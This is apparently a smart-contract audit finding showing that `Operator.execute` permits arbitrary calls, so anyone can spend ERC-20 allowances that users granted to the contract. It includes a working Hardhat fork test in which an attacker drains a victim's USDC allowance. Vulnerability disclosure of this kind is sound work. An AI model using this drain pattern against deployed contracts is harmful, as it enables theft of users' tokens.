### Title
Arbitrary calls through `Operator.execute` can drain ERC-20 allowances - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` lets any unprivileged caller specify an arbitrary target and calldata, which are executed with `Operator` as the external `msg.sender`. [1](#0-0)  Consequently, any ERC-20 allowance granted by a victim to `Operator` can be consumed by an attacker through a `transferFrom(victim, attacker, amount)` call. [2](#0-1) 

### Finding Description
`Operator.execute` iterates over attacker-supplied `Call` structs and invokes `_call.target.functionCallWithValue(_call.callData, _call.value)` without a target whitelist, selector validation, or calldata restrictions. [3](#0-2)  Although `setMsgSender` records the EOA in transient storage, ordinary ERC-20 contracts do not query `getActualMsgSender`, so they continue to see `Operator` as the spender. [4](#0-3)  `SynthContext` only translates the caller for Metronome contracts that explicitly resolve the configured operator. [5](#0-4) 

### Impact Explanation
An attacker can steal up to the full amount of any ERC-20 token that a victim has approved to `Operator`. The attacker needs no privilege and supplies only the token address plus encoded `transferFrom` calldata; the token validates the pre-existing `victim -> Operator` allowance and sends the assets to the attacker. [2](#0-1) 

### Likelihood Explanation
The exploit requires users to have an existing nonzero token allowance to the deployed `Operator`; the production flow itself primarily requires allowances to `DepositToken`, `NativeTokenGateway`, or `SmartFarmingManager`, rather than to `Operator`. [6](#0-5)  Once even one such allowance exists, exploitation is permissionless and repeatable because `execute` is public and does not authenticate the requested target. [7](#0-6) 

### Recommendation
Restrict `Operator.execute` to explicitly allowlisted Metronome targets and required external helpers, or maintain separate allowlists for permitted target/function-selector combinations. Do not permit arbitrary ERC-20 contracts as call targets unless the selector and decoded arguments are validated. At minimum, reject calls to arbitrary `transferFrom` entry points and document that users must never approve the `Operator` contract directly.

### Proof of Concept
The following Hardhat fork test extends the existing forked `Operator` test setup, establishes the vulnerable precondition of a victim allowance to `Operator`, and demonstrates an unprivileged attacker draining it:

```ts
// test/Operator.arbitrary-call.t.ts
import {expect} from 'chai'
import {deployments, ethers} from 'hardhat'
import {parseUnits} from '@ethersproject/units'
import {setTokenBalance, enableForking} from './helpers'
import Address from '../helpers/address'

describe('Operator arbitrary call allowance theft', function () {
  before(enableForking)

  it('drains an ERC20 allowance granted to Operator', async function () {
    const [deployer, victim, attacker] = await ethers.getSigners()

    const operatorFactory = await ethers.getContractFactory('Operator', deployer)
    const operator = await operatorFactory.deploy()

    const usdc = await ethers.getContractAt('ERC20', Address.USDC_ADDRESS, deployer)
    const amount = parseUnits('100', 6)

    await setTokenBalance(usdc.address, victim.address, amount)

    // Pre-existing user approval to the Operator contract.
    await usdc.connect(victim).approve(operator.address, amount)

    const calls = [
      {
        target: usdc.address,
        value: 0,
        callData: usdc.interface.encodeFunctionData('transferFrom', [
          victim.address,
          attacker.address,
          amount,
        ]),
      },
    ]

    await operator.connect(attacker).execute(calls)

    expect(await usdc.balanceOf(attacker.address)).to.eq(amount)
    expect(await usdc.balanceOf(victim.address)).to.eq(0)
    expect(await usdc.allowance(victim.address, operator.address)).to.eq(0)
  })
})
```

The test works because the call originates from `Operator`, while `transferFrom` consumes the victim’s allowance for that contract. [8](#0-7)  The existing test suite confirms that arbitrary calls are the intended execution model and that reentrancy protection does not prevent this single external call. [9](#0-8)
